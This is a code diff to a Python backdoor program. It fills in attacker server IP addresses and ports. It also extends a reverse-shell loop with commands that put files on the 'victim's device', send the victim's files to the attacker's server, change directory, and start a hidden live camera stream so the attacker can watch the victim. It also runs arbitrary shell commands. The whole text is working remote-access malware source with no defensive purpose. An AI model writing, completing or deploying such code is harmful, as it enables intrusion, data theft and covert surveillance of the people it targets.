@@ -9,11 +9,13 @@ import json
 import geocoder
 import gps  
 import io
+import shlex
 from PIL import ImageGrab
-SERVER_URL = "PUBLIC SERVER"
-WEBSOCKET_URL="WEBSOCKET"
-PORT="PORT"
-IP_ADDRESS="IP ADDRESS"
+import threading
+SERVER_URL = "192.168.88.105:2020"
+WEBSOCKET_URL="ws://192.168.88.105:8765"
+PORT="12345"
+IP_ADDRESS="192.168.88.105"
 banner = r"""
 ██████╗  █████╗  ██████╗██╗  ██╗██████╗  ██████╗  ██████╗ ██████╗ 
 ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗
@@ -152,13 +154,41 @@ def reverse_shell_payload():
     s.send(banner.encode())
     while True:
         try:
-           cmd = input("~sh ")
+           cmd = input("~shell@backdoor ")
            cmd = s.recv(1024).decode("utf-8").strip()
            if not cmd:
                continue
            if cmd.lower() == "help":
                s.send(banner.encode())
                continue
+           if cmd.lower().startswith("put-files"):
+                args_files = cmd.split()
+                if  put_files(args_files) == True:
+                   s.send(b"The files put on victim's device")
+                else:
+                    s.send(b"An issue when put files")
+                continue
+           if cmd.startswith("send"):
+                args_files = cmd.split()
+                if get_files(args_files) == True:
+                    s.send(b"Files have been sent to the server\n")
+                else:
+                    s.send(b"The files did't come to your server check the code")
+                continue
+           if cmd.lower().startswith("cd"):
+                try:
+                    parts = shlex.split(cmd)
+                    if len(parts) > 1:
+                        os.chdir(parts[1])
+                    s.send(f"{os.getcwd()}\n".encode())
+                except Exception as e:
+                    s.send(f"[-] {e}\n".encode())
+                continue
+           if cmd.lower() == "start-camera-live":
+               threading.Thread(target=watch_victim_live,daemon=True).start()
+               s.send(b"You are watching the victim for your mailicous server")
+           if cmd.lower() == "exit":
+               break
            else:
                output = subprocess.run(
                    cmd,
